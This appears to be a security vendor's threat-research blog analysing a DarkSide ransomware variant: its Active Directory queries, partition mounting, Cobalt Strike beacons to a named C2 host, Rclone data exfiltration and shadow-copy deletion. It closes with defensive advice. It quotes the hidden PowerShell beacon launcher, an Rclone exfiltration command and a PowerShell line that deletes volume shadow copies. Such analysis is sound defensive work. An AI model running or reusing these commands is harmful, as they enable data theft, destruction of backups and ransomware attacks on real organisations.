FortiGuard Labs Threat Research Report
Affected Platforms: Windows
Level of Risk: HIGH/MEDIUM. This ransomware variant, written by the same criminals that
targeted Colonial Pipeline, exhibits the ability to detect and compromise partitioned hard
drives, a behavior not seen before.
Impact: MEDIUM. This attack currently appears to be confined to targeted organizations and
is not the result of widespread wormlike activity.

Introduction of DarkSide Ransomware
FortiGuard Labs has uncovered additional tactics used by the threat actors that attacked
Colonial Pipeline. In this different DarkSide ransomware variant, FortiGuard Labs
researchers uncovered an ability to seek out partition information and compromise multiple
disk partitions.
At the time of discovery, FortiGuard Labs researchers believed the ransomware was seeking
out partitions to find possible hidden partitions setup by systems administrators to hide
backup files. But further analysis confirmed an even more advanced technique. The
DarkSide Ransomware variant seeks out partitions on a multi-boot system to find additional
files to encrypt, thereby causing greater damage and an increased incentive to pay a ransom
to recover files.
In this blog the reader will discover:
1. DarkSide ransomware code is efficient and well-constructed, indicating that their
cybercriminal organization includes experienced software engineers
2. The DarkSide ransomware variant (NOT the version used to disrupt Colonial Pipeline
operations) is advanced in nature and was observed to seek out partitions in a multiboot environment to create further damage. It also seeks out the domain controller and
connects to its active directory via LDAP anonymous authentication.
3. Additional insight on the files used by, and associated with, DarkSide was uncovered
by the FortiGuard Incident Response team during recent engagements.
4. The use of a well-known (to threat researchers) bulletproof host that has been used by
a wide variety of malicious actors for numerous nefarious activities over the years,
including the 2016 DNC elections attack in the United States.

Expanded Analysis of the DarkSide Ransomware Variant by
FortiGuard Labs
FortiGuard Labs encountered novel techniques in this DarkSide ransomware variant
cybercriminal organization not seen before in ransomware. The DarkSide ransomware
variant[1] was obtained through our partnership with CTA.
This ransomware sample, unrelated to the Colonial Pipeline campaign, was programmed
efficiently with very little wasted space, and compiler bloat has been kept to a minimum,
which is unusual for most malware. While the file size is relatively small for malware (57,856
bytes), it can deliver a much-larger-than-expected payload. The following section will look
closer at two of the more unique functions that this DarkSide variant carries out. One deals
with Active Directory and the other is concerned with partitions.

2/9

Malicious actors know that Active Directory is basically a goldmine of network information. In
this campaign, the DarkSide group included an Active Directory attack in their ransomware
software. To accomplish this, it first attempts to look for domain controllers.
Figure 1: finding domain controllers
If any domain controllers are found, it will then use them to try and connect to the Active
Directory. However, because permissions are usually required to do this, the DarkSide
ransomware variant attempts to use LDAP to authenticate anonymously. Note the use of a
null password and a null username in the following sequence:
Figure 2: LDAP anonymous authentication
This DarkSide ransomware variant may then use COM to interface with Active Directory
itself. If successful, the malware attempts to delete certain variables, such
as defaultNamingContext and dnsHostName.
After issuing Active Directory queries, the ransomware then attempts to encrypt files in
network shares found in this section of the code. Note that DarkSide makes a point to avoid
shares named C$ and ADMIN$, and also first checks to see if a share is writeable before
trying to encrypt files in it. C$ and ADMIN$ are default and known admin shares, which are
supposed to only be accessible by members of the Administrators group or the Backup
Operators group if they have not been disabled or reconfigured. It seems likely that DarkSide
avoids these shares on the chance that it may not be running in the context of an
Administrator and attempts to access them could potentially trigger an alert.
A more unique operation was found elsewhere. In a similar fashion to Petya (also known as
NotPetya) ransomware, DarkSide also scans the hard drive to perform additional actions. In
the case of Petya, the MBR (Master Boot Record) was infected so that when a user turned
on the computer it booted a ransom note straight from the MBR and essentially rendered the
computer useless. (For more information on how this was done, please refer to our Petya
blog here.) In the case of the DarkSide ransomware, however, it scans the drive to see if it is
a multi-boot system to find additional volumes/partitions to try and encrypt their files as well.
(NOTE: While the technical definitions of partition and volume are different, the two will be
used interchangeably for the purposes of this blog.)
Figure 3: Loop through volumes
After the malware finds a targeted drive type, it checks the version of Windows it is running
on. For systems running Windows 7 and above, the malware looks for volumes with a
bootmgr file in it. The bootmgr file may be found in the root of the C:\ drive or it may be
stored in another volume.
Figure 4: Newer OS

3/9

For systems older than Windows 7, DarkSide chooses a different approach. It calls the
DeviceIoControl API using the IOCTL_DISK_GET_PARTITION_INFO_EX control code.
(Incidentally, Petya also used this control code. Some of the similarities between the two
attacks are quite interesting.) According to Microsoft, this control code retrieves extended
information about the type, size, and nature of a disk partition. This DarkSide ransomware
variant, however, uses the results in a different manner.
Figure 5: Partitions
If the partition style it finds is an MBR (Master Boot Record), it will go ahead and check to
see if this partition is bootable. If not, then it will try to mount the partition. This appears to be
a programming bug, as bootable partitions may contain databases and other relevant data.
Perhaps DarkSide is looking to only encrypt files inside data partitions rather than those
found in bootable partitions.
Figure 6: Possible MBR bug
However, if the partition style is GPT (GUID [Globally Unique Identifier] Partition Table),
DarkSide takes another step. The first entry in a GUID partition’s format is the partition’s
type, and as expected, it is defined by a GUID.
Partition Definition

GUID

EFI System

{C12A7328-F81F-11D2-BA4B-00A0C93EC93B}

Windows Recovery Environment

{ DE94BBA4-06D1-4D40-A16A-BFD50179D6AC}

Figure 7: Partition types
If either of these GUIDs match the results from the call to the DeviceIoControl API, then
DarkSide skips these partitions and moves on to the next one. (Unlike Petya, it appears that
DarkSide at least wants to leave the infected machines in a semi-recoverable state for
obvious reasons.) At this point (whether an MBR data partition or a non-excluded GPT
volume), DarkSide goes ahead and attempts to mount the partition using the
SetVolumeMountPointW API. Once a volume is successfully mounted, DarkSide then
attempts to encrypt the files contained within.
As far as we have been able to determine, these actions are new to the ransomware scene.
As a result, the global cyber security community may not be properly protected against this
attack strategy.

Additional Files Observed Being Used in an Alternate DarkSide
Ransomware Campaign
While the above sample came from trusted partners, the FortiGuard Incident Response
team has observed other activities related to the DarkSide Cybercriminals. The details
gained from these observations shed additional light on the tactics and techniques used by
the DarkSide cybercriminals. For example, they provide further insight into their usage of an
SMB beacon, an HTTPS beacon, an exfiltration component using a command line tool
named Rclone, WMI activity, and malware execution.
SMB and HTTPS Beacon
Further analysis of an SMB beacon used by DarkSide reveals Cobalt Strike PowerShell
code. Here, the environment variable %COMSPEC% has the value
of “C:\Windows\System32\cmd.exe” and provides command line arguments, unbeknownst to
the user and to evade detection, that start the PowerShell application minimized without
creating a new window. The encoded PowerShell code is the Cobalt Strike SMB Beacon
payload:
%COMPSPEC% /b /c start /b /min powershell -nop -w hidden -encodedcommand <Encoded
SMB Beacon payload>
The decoded PowerShell command creates a named pipe, “\\.\pipe\UIA_PIPE_”, in its SMB
beacon communication. The pipe is bi-directional; both server and client processes can read
from and write to the pipe:
CreateNamedPipeA(\\.\pipe\UIA_PIPE_xxxx, 3, 6, 1, 4b000, 4b000, 0, 0)
Another finding is the discovery of an HTTPs Beacon. The following PowerShell command
runs the HTTPS BEACON payload on hosts that connect outbound to the malware’s
Command and Control (C2) server located at IP (185.180.197[.]86) . It does this using the
command InternetConnectA(server:tailgatethenation.com, port: 443, ).
%COMPSPEC% /b /c start /b /min powershell -nop -w hidden -encodedcommand <Encoded
HTTPS Beacon payload>
This C2 IP address, 185.180.197[.]86, was very active in 2019, and was observed again in
2021-04-19 after a long pause. We do not know why this IP address remained dormant for
over a year.
Figure 11. Historical traffic from 2019 – 2021 for 185.180.197[.]86
The passive DNS entries for the C2 IP 185[.]180[.]197[.]86 are listed below. Other threat
researchers have reported this IP being used by DarkSide, and this gives some insight into
the kinds of data it is used for. As can be seen, prior to its use as a C2 server for

5/9

ransomware, it was primarily used for pornography.

Further Examination of the DarkSide Ransomware C2: IP
Upon further examination, the 185[.]180[.]197[.]86 IP address was found to be co-located in
the United States with KingServers B.V. KingServers has been classified as a bulletproof
host by the infosec community, and although based in the Netherlands, it has ties to Russia,
where DarkSide is located.
Bulletproof hosting is a service provided by some hosting firms that provides considerable
leniency in the kinds of material uploaded and distributed by their customers, or in the
activities they can engage in without getting taken down. KingServers is a hosting site well
known to the InfoSec community and has been covered extensively by security journalist
Brian Krebs among others. Specifically, its hosting service was used in several notable
attacks, such as attacks on an India-based IT outsourcing firm to perpetrate gift card fraud,
as well as for the 2016 DNC attacks in the United States.
Review of observed telemetry over a 30-day period highlights a concentration of traffic from
U.S. based machines connecting to the DarkSide C2 server, with the United States at the top
(60%), followed by the Netherlands (9%), Singapore (8%), Brazil (4%), and Great Britain
(4%). This corresponds to reports that Darkside netted at least $60 million in its first seven
months, with $46 million coming in the first three months of this year.
Figure 13. Traffic to 185[.]180[.]197[.]86 over 30 days
Figure 14. Port 443 Traffic to 185.180.197[.]86 over 30 days
The Darkside ransomware attackers established command and control primarily with an
RDP client running over Port 443, routed through TOR. Connections between Port 443 and
the C2 server 185[.]180[.]197[.]86:443 over a 30-day period reveal a concentration of traffic
from U.S. based machines, with the United States at the top (82%), followed by the
Netherlands (9%), with Great Britain, Iceland, and the Philippines/Switzerland (tied) rounding
out the top 5 pings.

Exfiltration
A Windows task discovered during our analysis shows how data exfiltration was initiated. It
was performed using Rclone, a command line tool used to sync files and directories between
a local system and cloud storage. In this case, the Rclone binary was renamed to evade
detection and dropped into the directory “C:\Users\Public\”. The threat actor was looking to
exfiltrate files created in the last year in the file formats of .xls, .xlsx, .doc, .docx, and .pdf.

Rclone copy <source> <dest> –max-age 1y –ignore-existing –drive-chunk-size 512M –
buffer-size=4G –transfers 20 –checkers 40 –include *.{xls,xlsx,doc,docx,pdf}

WMI Activity
To thwart data recovery, the ransomware payload attempted to access the Windows
Management Instrumentation (WMI) service.
Further compounding the impact of the attack, the de-obfuscated PowerShell command was
discovered:
“Get-WmiObject W32_Shadowcopy | ForEach-Object {$_.Delete();}”
It used the PowerShell cmdlet Get-WmiObject to delete all the Volume Shadow copies to
thwart data recovery.

Malware Execution
PsExec, a remote administration tool, was seen running the main malware payload (.exe).
The ransomware payload (.dll) was hosted on a shared folder, and a batch script was run to
copy the payload to the host’s C:\Users\Public directory. This payload was executed using
rundll32, and a service was created to maintain persistence. There were multiple encryption
routines within the worker process, and the encryption routines were called directly to
perform encryption and create ransomware artifacts.

DarkSide Ransmware Conclusion
This blog highlights that the threat actors behind DarkSide are not your average ransomware
as a service group. Due to the sophistication of its attacks and code, it is also unlikely the
mastermind of one person. The level of detail, effort, planning and time that the group has
undertaken, not only creating the ransomware itself, but taking the time to note what data
was stolen, the amount of data, what it contained (as well as how much data in GB), and the
taken to organize and shame victims all highlight that this is the work of an organization with
considerable resources and time.

Other Mitigations
Due to the ease of disruption and potential for damage to daily operations, reputation, and
the unwanted release of personally identifiable information (PII), etc., it is essential to keep
all AV and IPS signatures up to date.
It is also vital to ensure that all known vendor vulnerabilities within an organization are
addressed and updated to protect against attackers establishing a foothold within a network.
Since most ransomware attacks originate with a compromised end user, organizations are
also encouraged to conduct ongoing training sessions to educate and inform personnel
about the latest phishing/spearphishing attacks. They also need to encourage employees to
never open attachments from someone they don't know and always treat emails from
unrecognized/untrusted senders with caution. This can be accomplished through regular
training sessions and impromptu tests using predetermined templates by an organizations'
internal security department. Simple user awareness training on how to spot emails with
malicious attachments or links could also help prevent initial access into the network.
